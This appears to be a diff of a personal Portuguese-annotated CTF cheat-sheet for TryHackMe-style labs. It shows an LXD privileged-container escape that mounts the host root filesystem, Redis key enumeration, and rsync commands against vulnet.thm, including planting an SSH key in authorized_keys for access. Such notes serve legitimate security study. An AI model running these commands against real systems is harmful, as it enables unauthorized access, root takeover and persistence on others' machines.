@@ -10,3 +10,18 @@ lxc init cd73 ignite -c security.privileged=true
 lxc config device add ignite cd73 disk source=/ path=/mnt/root recursive=true #mount path / to mnt/root
 lxc start ignite
 lxc exec ignite /bin/sh
+
+
+
+#redis
+redis-cli -h ip -a passwd
+keys * -> lista chaves
+get nomedachave -> exibe conteudo
+type nomedachave -> exibe o tipo lista,inteiro,varchar...
+lrange nomedachave 1 10 -> lista 10 registros, tipo lista
+
+#rsync
+rsync -av rsync://rsync-connect@vulnet.thm/files/sys-internal -> exibe todos arquivos
+rsync rsync://rsync-connect@vulnet.thm/files/sys-internal/user.txt . -> copia user.txt pra a pasta atual
+rsync id_rsa.pub rsync://rsync-connect@vulnet.thm/files/sys-internal/.ssh/authorized_keys -> copia chave ssh
+
